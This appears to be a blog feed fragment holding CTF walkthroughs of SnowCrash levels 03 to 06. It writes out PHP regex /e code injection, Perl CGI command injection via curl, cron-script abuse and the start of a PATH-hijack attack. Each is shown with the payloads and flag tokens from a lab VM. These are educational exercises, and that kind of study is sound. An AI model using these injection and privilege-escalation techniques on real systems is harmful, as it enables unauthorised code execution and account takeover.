+<p>We can see the level06.php file, so I tried to execute it first. Nothing came out but we verified that this php file worked correctly.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>level06.php
+<span class="c">#!/usr/bin/php</span>
+&lt;?php
+<span class="k">function </span>y<span class="o">(</span><span class="nv">$m</span><span class="o">)</span> <span class="o">{</span> <span class="nv">$m</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/</span><span class="se">\.</span><span class="s2">/"</span>, <span class="s2">" x "</span>, <span class="nv">$m</span><span class="o">)</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/@/"</span>, <span class="s2">" y"</span>, <span class="nv">$m</span><span class="o">)</span><span class="p">;</span> <span class="k">return</span> <span class="nv">$m</span><span class="p">;</span> <span class="o">}</span>
+<span class="k">function </span>x<span class="o">(</span><span class="nv">$y</span>, <span class="nv">$z</span><span class="o">)</span> <span class="o">{</span> <span class="nv">$a</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$y</span><span class="o">)</span><span class="p">;</span> <span class="nv">$a</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/(</span><span class="se">\[</span><span class="s2">x (.*)</span><span class="se">\]</span><span class="s2">)/e"</span>, <span class="s2">"y(</span><span class="se">\"\\</span><span class="s2">2</span><span class="se">\"</span><span class="s2">)"</span>, <span class="nv">$a</span><span class="o">)</span><span class="p">;</span> <span class="nv">$a</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/</span><span class="se">\[</span><span class="s2">/"</span>, <span class="s2">"("</span>, <span class="nv">$a</span><span class="o">)</span><span class="p">;</span> <span class="nv">$a</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/</span><span class="se">\]</span><span class="s2">/"</span>, <span class="s2">")"</span>, <span class="nv">$a</span><span class="o">)</span><span class="p">;</span> <span class="k">return</span> <span class="nv">$a</span><span class="p">;</span> <span class="o">}</span>
+<span class="nv">$r</span> <span class="o">=</span> x<span class="o">(</span><span class="nv">$argv</span><span class="o">[</span>1], <span class="nv">$argv</span><span class="o">[</span>2]<span class="o">)</span><span class="p">;</span> print <span class="nv">$r</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+<h4 id="3-we-can-convert-this-to-readable-at-the-site-below">3. We can convert this to readable at the site below.</h4>
+
+<p><a href="https://beautifytools.com/php-beautifier.php">Online PHP beautifier</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/php</span>
+&lt;?php
+<span class="k">function </span>y<span class="o">(</span><span class="nv">$m</span><span class="o">)</span> <span class="c"># Define function y</span>
+<span class="o">{</span>
+    <span class="nv">$m</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/</span><span class="se">\.</span><span class="s2">/"</span>, <span class="s2">" x "</span>, <span class="nv">$m</span><span class="o">)</span><span class="p">;</span>
+    <span class="nv">$m</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/@/"</span>, <span class="s2">" y"</span>, <span class="nv">$m</span><span class="o">)</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nv">$m</span><span class="p">;</span>
+<span class="o">}</span>
+<span class="k">function </span>x<span class="o">(</span><span class="nv">$y</span>, <span class="nv">$z</span><span class="o">)</span>  <span class="c"># Define function x</span>
+<span class="o">{</span>
+    <span class="nv">$a</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$y</span><span class="o">)</span><span class="p">;</span> 
+    <span class="c">#Read the contents of file $y</span>
+    <span class="nv">$a</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/(</span><span class="se">\[</span><span class="s2">x (.*)</span><span class="se">\]</span><span class="s2">)/e"</span>, <span class="s2">"y(</span><span class="se">\"\\</span><span class="s2">2</span><span class="se">\"</span><span class="s2">)"</span>, <span class="nv">$a</span><span class="o">)</span><span class="p">;</span>
+    <span class="c"># Replace [x ...] with the result of calling function y on the captured group (\2)</span>
+    <span class="nv">$a</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/</span><span class="se">\[</span><span class="s2">/"</span>, <span class="s2">"("</span>, <span class="nv">$a</span><span class="o">)</span><span class="p">;</span> <span class="c"># Replace [ with (</span>
+    <span class="nv">$a</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s2">"/</span><span class="se">\]</span><span class="s2">/"</span>, <span class="s2">")"</span>, <span class="nv">$a</span><span class="o">)</span><span class="p">;</span> <span class="c"># Replace ] with )</span>
+    <span class="k">return</span> <span class="nv">$a</span><span class="p">;</span>
+<span class="o">}</span>
+<span class="nv">$r</span> <span class="o">=</span> x<span class="o">(</span><span class="nv">$argv</span><span class="o">[</span>1], <span class="nv">$argv</span><span class="o">[</span>2]<span class="o">)</span><span class="p">;</span> <span class="c">#all function x with command line arguments</span>
+print <span class="nv">$r</span><span class="p">;</span> <span class="c">#Print the result</span>
+?&gt;
+</code></pre></div></div>
+
+<p>If we break down in to the php code,</p>
+
+<ul>
+  <li>
+    <p>Function y($m):</p>
+
+    <ul>
+      <li>Replaces dots (.) with spaces (‘ x ‘) and replaces ‘@’ with the string ‘y’ in the string $m, then returns the result.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Function x($y, $z): takes two inputs</p>
+
+    <ul>
+      <li>
+        <p>Reads the contents of the file specified by $y and stores it in $a.</p>
+      </li>
+      <li>
+        <p>/([x (.*)])/e : The given regular expression is a regular expression used in PHP. It matches a string starting with “x” inside square brackets. The part inside the square brackets is a capture group represented by the pattern (.*), which matches any string.</p>
+      </li>
+      <li>
+        <p>/e: This flag evaluates the matched pattern and returns it. It is a special flag used only in PHP, allowing the matched pattern to be evaluated as PHP code.</p>
+      </li>
+      <li>
+        <p>Replaces remaining [ and ] characters with ( and ), respectively.</p>
+      </li>
+      <li>
+        <p>Returns the result.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Variable $r:</p>
+
+    <ul>
+      <li>Stores the result of the x() function call.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Output:</p>
+
+    <ul>
+      <li>Prints the result.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>In summary, this regular expression finds the pattern [x …] in a string and evaluates it as PHP code, enabling the string to be transformed into dynamically executable PHP code.</p>
+
+<details>
+<summary> Example Regex (Regular expression) </summary>
+<br /><br />
+For example, consider the following string:
+<br /><br />
+
+<pre>
+<code>
+[x echo "Hello, world!"]
+</code>
+</pre>
+Suppose you want to find the [x ...] part in this string and execute PHP code inside it.
+<br /><br />
+In this case, you can use the regular expression /(\[x (.*)\])/e, and with this regular expression, you can use the preg_replace() function in PHP as follows:
+
+<pre>
+<code>
+$string = "[x echo \"Hello, world!\"]";
+$result = preg_replace('/(\[x (.*)\])/e', "$2", $string);
+echo $result; // Output: Hello, world!
+</code>
+</pre>
+<br />
+In the above code, $2 represents the second capture group, which corresponds to the PHP code inside the [x ...] part. <br /><br />Therefore, the preg_replace() function finds the matching pattern [x ...], evaluates and executes the PHP code inside it (in this case, echo "Hello, world!"), and returns the result.<br /><br /> 
+In this case, it returns the string "Hello, world!"."
+
+
+</details>
+
+<h4 id="4-we-want-to-modify-the-input-string-x-anything-here-so-that-the-second-capture-group-in-the-regular-expression-will-be-replaced-by-getflag-this-way-when-the-function-y-is-called-it-will-execute-the-command-getflag">4. We want to modify the input string <code class="language-plaintext highlighter-rouge">[x (anything here)]</code> so that the second capture group in the regular expression will be replaced by <code class="language-plaintext highlighter-rouge">${'getflag'}</code>. This way, when the function y() is called, it will execute the command getflag.</h4>
+
+<h4 id="5-so-our-modified-input-string-should-be-x-getflag-this-will-allow-us-to-use-variable-interpolation-to-execute-the-getflag-command-within-the-y-function">5. So, our modified input string should be [x ${‘getflag’}]. This will allow us to use variable interpolation to execute the getflag command within the y() function.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@SnowCrash:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'[x {${`getflag`}}]'</span> <span class="o">&gt;</span> /tmp/getflag
+level06@SnowCrash:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/getflag
+<span class="o">[</span>x <span class="o">{</span><span class="k">${</span><span class="sb">`</span>getflag<span class="sb">`</span><span class="k">}</span><span class="o">}]</span>
+</code></pre></div></div>
+
+<h4 id="6-and-we-can-get-the-password-as-below">6. And we can get the password as below.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@SnowCrash:~<span class="nv">$ </span>./level06 /tmp/getflag
+PHP Notice:  Undefined variable:
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ <span class="k">in</span> /home/user/level06/level06.php<span class="o">(</span>4<span class="o">)</span> : regexp code on line 1
+</code></pre></div></div>
+
+<p>####  7. We got a token for level07</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level05</title><link href="http://localhost:4000/cyber/security/Level05/" rel="alternate" type="text/html" title="Snow-crash Level05" /><published>2024-02-13T00:00:00+09:00</published><updated>2024-02-13T00:00:00+09:00</updated><id>http://localhost:4000/cyber/security/Level05</id><content type="html" xml:base="http://localhost:4000/cyber/security/Level05/"><![CDATA[<h4 id="1-the-password-of-level05-is-the-token-that-got-from-level04">1. The password of <code class="language-plaintext highlighter-rouge">Level05</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level04</code>.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ne2searoevaevoem4ov4ar8ap
+
+</code></pre></div></div>
+<h4 id="2-so-try-login-to-level05-with-the-password-we-got-from-level04-and-try-to-put-the-command-ls--la-lets-see-inside-in-level05">2. So, try login to <code class="language-plaintext highlighter-rouge">Level05</code> with the password we got from <code class="language-plaintext highlighter-rouge">Level04</code> and try to put the command ‘ls -la’. Let’s see inside in level05.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@localhost's password: ne2searoevaevoem4ov4ar8ap
+You have new mail.
+level05@SnowCrash:~$
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+level05@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 12
+dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span>  1 level05 level05  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span>  1 level05 level05 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span>  1 level05 level05  675 Apr  3  2012 .profile
+</code></pre></div></div>
+
+<p>It says that there is a new mail.</p>
+
+<h4 id="4-so-i-found-the-small-hint-from-varmaillevel05">4. So, I found the small hint from /var/mail/level05</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:~<span class="nv">$ </span><span class="nb">cd</span> /var/mail
+level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 4
+drwxrwsr-x  1 root mail  60 Mar  5  2016 <span class="nb">.</span>
+drwxr-xr-x  1 root root 160 Mar 12  2016 ..
+<span class="nt">-rw-r--r--</span>+ 1 root mail  58 Feb 13 16:49 level05
+</code></pre></div></div>
+
+<p>there is a file <code class="language-plaintext highlighter-rouge">level05</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat </span>level05
+<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> su <span class="nt">-c</span> <span class="s2">"sh /usr/sbin/openarenaserver"</span> - flag05
+</code></pre></div></div>
+<p>So, I was looking for /usr/sbin/openarenaserver and we found a script as below. Let’s take a look inside one by one.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat</span> /usr/sbin/openarenaserver
+<span class="c">#!/bin/sh</span>
+
+<span class="k">for </span>i <span class="k">in</span> /opt/openarenaserver/<span class="k">*</span> <span class="p">;</span> <span class="k">do</span> 
+
+	<span class="o">(</span><span class="nb">ulimit</span> <span class="nt">-t</span> 5<span class="p">;</span> bash <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="o">)</span>
+	<span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+<p>That means that the script goes through each file in the specified directory, sets a CPU time limit of 5 seconds for its execution, executes the script with debugging output, and then removes the script file.</p>
+
+<p>We can’t and should not put anything inside <code class="language-plaintext highlighter-rouge">/opt/openarenaserver</code> because this directory will be deleted in every 2 minutes, so we should put our file safely in <code class="language-plaintext highlighter-rouge">/tmp</code> file.</p>
+
+<p>We therefore, need to create a bash script in that directory,to get the file and to make sure that the optut is redirected to a file in <code class="language-plaintext highlighter-rouge">/tmp</code>. So, the overall effect of this command is to create a file named <code class="language-plaintext highlighter-rouge">getflag05</code> in the <code class="language-plaintext highlighter-rouge">/opt/openarenaserver/</code> directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'getflag &gt; /tmp/flag05'</span>
+getflag <span class="o">&gt;</span> /tmp/flag05
+level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'getflag &gt; /tmp/flag05'</span> <span class="o">&gt;</span> /opt/openarenaserver/getflag05
+level05@SnowCrash:/usr/sbin<span class="nv">$ </span><span class="nb">cat</span> /tmp/flag05
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat</span> /tmp/flag05
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+</code></pre></div></div>
+
+<h4 id="5--we-got-a-token-for-next-level06">5.  We got a token for next <code class="language-plaintext highlighter-rouge">level06</code></h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>viuaaale9huek52boumoomioc
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="Cyber" /><category term="security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level04</title><link href="http://localhost:4000/cyber/security/Level04/" rel="alternate" type="text/html" title="Snow-crash Level04" /><published>2024-02-13T00:00:00+09:00</published><updated>2024-02-13T00:00:00+09:00</updated><id>http://localhost:4000/cyber/security/Level04</id><content type="html" xml:base="http://localhost:4000/cyber/security/Level04/"><![CDATA[<h4 id="1-the-password-of-level04-is-the-token-that-got-from-level03">1. The password of <code class="language-plaintext highlighter-rouge">level04</code> is the token that got from <code class="language-plaintext highlighter-rouge">level03</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qi0maab88jeaj46qoumi7maus
+</code></pre></div></div>
+<h4 id="2-so-try-login-to-level04-with-the-password-we-got-from-level03-and-try-to-put-the-command-ls--la-we-can-see-the-file-level04">2. So, try login to <code class="language-plaintext highlighter-rouge">level04</code> with the password we got from <code class="language-plaintext highlighter-rouge">level03</code> and try to put the command ‘ls -la’. We can see the file ‘level04’.</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span>su level04
+Password: qi0maab88jeaj46qoumi7maus
+level04@SnowCrash:~<span class="err">$</span>
+</code></pre></div></div>
+<h4 id="3-lets-go-inside-in-level04">3. Let’s go inside in level04.</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span>  1 level04 level04  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span>  1 level04 level04 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span>  1 level04 level04  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-sr-x</span>  1 flag04  level04  152 Mar  5  2016 level04.pl
+level04@SnowCrash:~<span class="nv">$ </span>./level04.pl
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+	LANGUAGE <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
+	LC_ALL <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
+	LC_TERMINAL_VERSION <span class="o">=</span> <span class="s2">"3.4.23"</span>,
+	LC_CTYPE <span class="o">=</span> <span class="s2">"UTF-8"</span>,
+	LC_TERMINAL <span class="o">=</span> <span class="s2">"iTerm2"</span>,
+	LANG <span class="o">=</span> <span class="s2">"en_US.UTF-8"</span>
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale <span class="o">(</span><span class="s2">"C"</span><span class="o">)</span><span class="nb">.</span>
+Content-type: text/html
+</code></pre></div></div>
+
+<p>We can see A file with <code class="language-plaintext highlighter-rouge">.pl</code> extension.</p>
+
+<p>So, what is a PL file?</p>
+
+<p>A file with .pl extension is a <code class="language-plaintext highlighter-rouge">Perl Script</code> file that is a scripting language.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>level04.pl
+<span class="c">#!/usr/bin/perl</span>
+<span class="c"># localhost:4747</span>
+use CGI qw<span class="o">{</span>param<span class="o">}</span><span class="p">;</span>
+print <span class="s2">"Content-type: text/html</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
+sub x <span class="o">{</span>
+  <span class="nv">$y</span> <span class="o">=</span> <span class="nv">$_</span><span class="o">[</span>0]<span class="p">;</span>
+  print <span class="sb">`</span><span class="nb">echo</span> <span class="nv">$y</span> 2&gt;&amp;1<span class="sb">`</span><span class="p">;</span>
+<span class="o">}</span>
+x<span class="o">(</span>param<span class="o">(</span><span class="s2">"x"</span><span class="o">))</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>This is a simple <code class="language-plaintext highlighter-rouge">CGI(Common Gateway Interface) script</code> that takes a parameter “x” from the query string and prints the result of runnig the command specified by the parameter using the <code class="language-plaintext highlighter-rouge">echo</code> commmand.</p>
+
+<details>
+<summary> Note: What is CGI?  </summary>
+<br />
+What is CGI? : CGI, or Common Gateway Interface, is a standard interface that enables communication between a web server and external programs or scripts. It allows for the creation of dynamic web pages, processing user input, and interaction with databases.
+</details>
+
+<p><br /></p>
+<details>
+<summary> Note: What is query?  </summary>
+<br />
+In the context of the Perl CGI script provided, the "query" refers to the string of parameters and their values that are passed to the script through the URL when it is accessed.
+<br /><br />
+This string typically follows a question mark (?) in the URL and consists of key-value pairs separated by ampersands (&amp;).
+<br /><br />
+For example, if you access the script via a URL like this:
+<br /><br />
+
+http://example.com/cgi-bin/script.cgi?x=ls%20-l
+
+<br /><br />
+In this URL, the query string is x=ls%20-l. Here, x is the parameter name, and ls%20-l is its value. The %20 is a URL-encoded representation of a space character.
+<br /><br />
+So, in this example, the query is x=ls%20-l, where the parameter x is assigned the value ls -l. When the Perl CGI script is executed with this query, it retrieves the value of the x parameter (ls -l in this case) and executes it as a command.
+</details>
+
+<p><br /></p>
+<details>
+<summary> Details for the perl script </summary>
+<br />
+
+1. `#!/usr/bin/perl`: This is a hashebang line specifying the path to the Perl interpreter to be used to execute this script.
+<br /><br />
+
+2. `use CGI qw{param};`: This line imports the param function from the CGI module. The param function is used to retrieve the values of parameters from the query string.
+<br /><br />
+
+3. `print "Content-type: text/html\n\n";`: This line sends an HTTP header indicating that the content is of type "text/html". The double newline (\n\n) separates the header from the body.
+<br /><br />
+
+4. `sub x { ... }`: This defines a subroutine (function) named "x". It takes one parameter and assigns its value to the variable $y.
+<br /><br />
+
+5. `$y = $_[0];`: This line assigns the value of the first (in this case, only) argument passed to the subroutine to the variable $y.
+<br /><br />
+
+6. `print echo $y 2&gt;&1;`: This line prints the result of the command specified in $y. Backticks (``) are used to execute the command, and `2&gt;&amp;1` redirects both standard output and standard error to the output. This is a common technique to capture both normal output and error messages.
+<br /><br />
+
+7. `x(param("x"));`: This line calls the subroutine "x" using the value of the "x" parameter from the query string.
+<br /><br />
+
+In summary, the script takes a parameter named "x" from the query string, uses it as a command, executes the command, and prints the result.
+<br />
+</details>
+<p><br /></p>
+
+<p>We can see another interesting thing in that perl script.
+The script indicates that</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># localhost:4747</span>
+</code></pre></div></div>
+
+<p>Maybe, there is something on the port 4747.</p>
+
+<h4 id="4-lets-check-on-the-port-4747">4. Let’s check on the port 4747.</h4>
+
+<p><code class="language-plaintext highlighter-rouge">nc -zv</code> allows to check connection to 4747 without sending any data and verbose mode.</p>
+
+<details>
+<summary> What is 'nc' command in Linux </summary>
+<br />
+1. nc : This is the command itself, which is short for "netcat." Netcat is a versatile networking utility for reading from and writing to network connections using TCP or UDP protocols.
+<br />
+2.  -z: This option tells nc to scan for open ports rather than initiating a data transfer. When used with the -v option, it prints verbose output, indicating whether the connection was successful or not.
+<br />
+3.  -v: This option stands for "verbose" and instructs nc to provide more detailed output, including the status of each connection attempt.
+<br />
+So, when you run nc -zv, you are instructing Netcat to attempt to connect to a specified host and port without sending any data (-z), while also providing verbose output (-v) to show the result of each connection attempt. This is commonly used for port scanning to check if a port on a remote system is open or closed.
+<br />
+</details>
+<p><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>nc <span class="nt">-zv</span> localhost 4747
+Connection to localhost 4747 port <span class="o">[</span>tcp/<span class="k">*</span><span class="o">]</span> succeeded!
+</code></pre></div></div>
+
+<h4 id="5-now-combine-numbers-3-and-4-and--lets-send-data-using-the-x-parameter-and-port-4747-with-curl-command">5. Now, combine numbers 3 and 4 and  let’s send data using the <code class="language-plaintext highlighter-rouge">x parameter</code> and <code class="language-plaintext highlighter-rouge">port 4747</code> with <code class="language-plaintext highlighter-rouge">curl</code> command.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>curl <span class="s1">'localhost:4747/level04.pl?x=`whoami`'</span>
+flag04
+</code></pre></div></div>
+
+<p>We got the <code class="language-plaintext highlighter-rouge">Flag04</code> with the whoami parameter.</p>
+
+<p>Maybe we can try again with x parameter with getflag. And here we go, we got the flag :)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>curl <span class="s1">'localhost:4747/level04.pl?x=`getflag`'</span>
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+</code></pre></div></div>
+
+<h4 id="6-we-got-a-token-for-next-level05">6. We got a token for next level05</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ne2searoevaevoem4ov4ar8ap
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="Cyber" /><category term="security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level03</title><link href="http://localhost:4000/cyber/security/Level03/" rel="alternate" type="text/html" title="Snow-crash Level03" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/cyber/security/Level03</id><content type="html" xml:base="http://localhost:4000/cyber/security/Level03/"><![CDATA[<h4 id="1-the-password-of-level03-is-the-token-that-got-from-level02">1. The password of <code class="language-plaintext highlighter-rouge">level03</code> is the token that got from <code class="language-plaintext highlighter-rouge">level02</code>.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kooda2puivaav1idi4f57q8iq
+</code></pre></div></div>
+<h4 id="2-so-try-login-to-level03-with-the-password-we-got-from-level02-and-try-to-put-the-command-ls-we-can-see-the-file-level03">2. So, try login to level03 with the password we got from level02 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the file <code class="language-plaintext highlighter-rouge">level03</code>.</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~<span class="nv">$ </span>su level03
+Password: kooda2puivaav1idi4f57q8iq
+level03@SnowCrash:~<span class="nv">$ </span><span class="nb">ls
+</span>level03
+</code></pre></div></div>
+<h4 id="3-try-to-execute-the-level03-but-it-says-exploit-me">3. Try to execute the <code class="language-plaintext highlighter-rouge">level03</code>. but it says <code class="language-plaintext highlighter-rouge">Exploit me</code>.</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span>./level03
+Exploit me
+</code></pre></div></div>
+<h4 id="4-when-we-check-with-cat-command-we-can-see-the-file-type-as-below-so-we-can-assume-that-its-binary-file-a-binary-file-is-a-computer-file-that-is-not-a-text-file">4. When we check with <code class="language-plaintext highlighter-rouge">cat</code> command, we can see the file type as below. so, we can assume that it’s <code class="language-plaintext highlighter-rouge">binary file</code>. (A binary file is a computer file that is not a text file.)</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>level03
+ELF44 	<span class="o">(</span><span class="nv">$!</span>444  TTT��<span class="o">(((</span>��hhhDDP�td44Q�tdR�td��/lib/ld-linux.so.2GNUGNUOX�<span class="p">;</span>�Sy8n�n��KT<span class="o">{</span>K �K��3LD<span class="o">=</span> T<span class="o">)</span>__gmon_start__libc.so.
+6_IO_stdin_usedsetresgidsetresuidsystemgeteg��geteuid__libc_start_mainGLIBC_2.0ii
+...
+..
+<span class="nb">.</span>
+</code></pre></div></div>
+<h4 id="5-so-lets-debug-with-ltrace-ltrace-is-a-debugging-utility-on-unix-like-systems-that-can-be-used-to-intercept-and-display-dynamic-library-calls">5. So, let’s debug with <code class="language-plaintext highlighter-rouge">ltrace</code>. <code class="language-plaintext highlighter-rouge">ltrace</code> is a debugging utility on Unix-like systems that can be used to intercept and display dynamic library calls.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span>ltrace ./level03
+__libc_start_main<span class="o">(</span>0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 &lt;unfinished ...&gt;
+getegid<span class="o">()</span>                                         <span class="o">=</span> 2003
+geteuid<span class="o">()</span>                                         <span class="o">=</span> 2003
+setresgid<span class="o">(</span>2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
+setresuid<span class="o">(</span>2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
+system<span class="o">(</span><span class="s2">"/usr/bin/env echo Exploit me"</span>Exploit me
+ &lt;unfinished ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span>                            <span class="o">=</span> 0
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div></div>
+<p>We found the echo of “Exploit me”, the same result when we execute ./level03 at the beginning.</p>
+
+<p><code class="language-plaintext highlighter-rouge">system("/usr/bin/env echo Exploit me"Exploit me</code></p>
+
+<p>It shows that <code class="language-plaintext highlighter-rouge">echo</code> command is executed from the located in <code class="language-plaintext highlighter-rouge">/usr/bin/env</code>.</p>
+
+<p>If so, we can control the execution of the env command by changing the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable.</p>
+
+<h4 id="6-to-execute-the-program-getflag-located-in-bin-as-if-it-were-echo-we-create-a-symbolic-link-named-echo-to-pointing-getflag-in-tmp-directory-by-adding-tmp-to-the-path-we-ensure-that-our-fake-echo-in-tmp-is-executed-when-env-searches-for-the-echo-command">6. To execute the program <code class="language-plaintext highlighter-rouge">getflag</code> located in <code class="language-plaintext highlighter-rouge">/bin</code> as if it were echo, we create a symbolic link named echo to pointing <code class="language-plaintext highlighter-rouge">getflag</code> in <code class="language-plaintext highlighter-rouge">/tmp</code> directory. By adding <code class="language-plaintext highlighter-rouge">/tmp</code> to the PATH, we ensure that our fake echo in <code class="language-plaintext highlighter-rouge">/tmp</code> is executed when <code class="language-plaintext highlighter-rouge">env</code> searches for the <code class="language-plaintext highlighter-rouge">echo</code> command.</h4>
+
